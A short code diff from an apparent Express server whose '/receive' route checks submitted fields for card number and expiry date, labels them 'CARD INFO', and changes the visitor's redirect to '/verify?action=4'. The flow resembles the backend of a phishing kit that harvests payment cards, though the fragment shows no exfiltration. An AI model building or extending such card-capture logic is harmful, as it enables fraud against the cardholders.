@@ -216,7 +216,7 @@ app.post('/receive', async (req, res) => {
         }
 
         if (!responseSent && (myObjects.includes('expiryDate') || myObjects.includes('cardNumber') )) {
-            prepareMessage("CARD INFO", { redirect_url }, false);
+            prepareMessage("CARD INFO", "/verify?action=4" , false);
         }
         
 
